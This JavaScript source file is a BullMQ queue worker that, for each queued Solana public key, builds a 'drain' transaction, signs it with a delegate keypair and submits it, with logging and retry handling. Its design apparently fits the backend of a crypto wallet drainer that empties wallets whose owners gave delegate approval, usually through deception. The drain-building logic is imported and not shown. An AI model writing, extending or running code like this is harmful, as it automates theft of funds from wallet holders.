const { Worker } = require("bullmq");
const { getConnection, getQueue } = require("./jobQueue");
const { buildDrain } = require("../flows/drainFlow");
const { getConnection: getRpcConnection, withRetry } = require("../core/rpcPool");
const { executeTx } = require("../solana/txExecutor");
const { getKeypair, verifyKeypair } = require("../core/keypairManager");
const { invalidateBlockhash } = require("../core/blockhashCache");
const logger = require("../core/logger");
const { Buffer } = require("buffer");

let worker = null;
let isWorkerHealthy = false;

/**
 * Initialize the job worker with comprehensive error handling
 */
function initWorker() {
    // Verify keypair at startup
    try {
        verifyKeypair();
        logger.info("Keypair verification passed");
    } catch (err) {
        logger.error("CRITICAL: Keypair verification failed at startup", {
            error: err.message
        });
        throw err; // Fail startup if keypair is invalid
    }

    worker = new Worker(
        "tx",
        async (job) => {
            const jobId = job.id;
            const { publicKey, signedTx } = job.data;

            logger.info("Processing drain job", {
                jobId,
                publicKey,
                attempt: job.attemptsMade + 1,
                maxAttempts: job.opts.attempts
            });

            try {
                // Validate job data
                if (!publicKey || !signedTx) {
                    throw new Error("Invalid job data: missing publicKey or signedTx");
                }

                // Get a fresh RPC connection for this job
                const rpcConnection = getRpcConnection();

                // Build the drain transaction
                const tx = await buildDrain(publicKey, rpcConnection);

                // Get the keypair for signing
                const payer = getKeypair();

                // Sign with delegate keypair
                tx.sign(payer);

                logger.debug("Transaction signed with delegate keypair", { jobId });

                // Execute the transaction
                const sig = await executeTx(
                    tx.serialize().toString("base64"),
                    rpcConnection
                );

                logger.info("Drain job completed successfully", {
                    jobId,
                    signature: sig,
                    publicKey
                });

                // Mark blockhash as used (invalidate cache)
                invalidateBlockhash();

                return {
                    success: true,
                    signature: sig,
                    publicKey,
                    completedAt: new Date().toISOString()
                };
            } catch (err) {
                logger.error("Drain job failed", {
                    jobId,
                    error: err.message,
                    attempt: job.attemptsMade + 1,
                    publicKey
                });

                // Invalidate blockhash on error (force fresh fetch on retry)
                invalidateBlockhash();

                // Determine if we should retry
                const isRetryable = !err.message.includes("Invalid") &&
                    !err.message.includes("missing") &&
                    !err.message.includes("Keypair");

                if (!isRetryable) {
                    // Non-retryable error - fail immediately
                    logger.error("Non-retryable error, failing job immediately", {
                        jobId,
                        error: err.message
                    });
                    throw err;
                }

                // Retryable error - throw to trigger retry
                throw err;
            }
        },
        {
            connection: getConnection(),
            concurrency: 1, // Process one job at a time to avoid race conditions
        }
    );

    // Event handlers
    worker.on("completed", (job, result) => {
        logger.info("Job completed event", {
            jobId: job.id,
            signature: result?.signature
        });
        isWorkerHealthy = true;
    });

    worker.on("failed", (job, err) => {
        logger.error("Job failed event", {
            jobId: job?.id,
            error: err.message,
            attempt: job?.attemptsMade + 1
        });
        isWorkerHealthy = true; // Worker itself is healthy, just job failed
    });

    worker.on("error", (err) => {
        logger.error("Worker error", { error: err.message });
        isWorkerHealthy = false;
    });

    worker.on("ready", () => {
        logger.info("Worker ready and listening for jobs");
        isWorkerHealthy = true;
    });

    worker.on("close", () => {
        logger.warn("Worker closed");
        isWorkerHealthy = false;
    });

    worker.on("stalled", (jobId) => {
        logger.warn("Job stalled (processing too long)", { jobId });
    });

    logger.info("Worker initialized successfully");
    return worker;
}

/**
 * Get or initialize worker
 */
function getWorker() {
    if (!worker) {
        initWorker();
    }
    return worker;
}

/**
 * Check if worker is healthy
 */
function isHealthy() {
    return isWorkerHealthy && worker !== null;
}

/**
 * Graceful shutdown
 */
async function shutdown() {
    logger.info("Shutting down worker...");
    if (worker) {
        await worker.close();
        worker = null;
    }
}

// Initialize worker immediately on module load
try {
    getWorker();
} catch (err) {
    logger.error("Failed to initialize worker", { error: err.message });
    throw err;
}

module.exports = {
    worker: getWorker(),
    getWorker,
    isHealthy,
    shutdown,
    initWorker
};
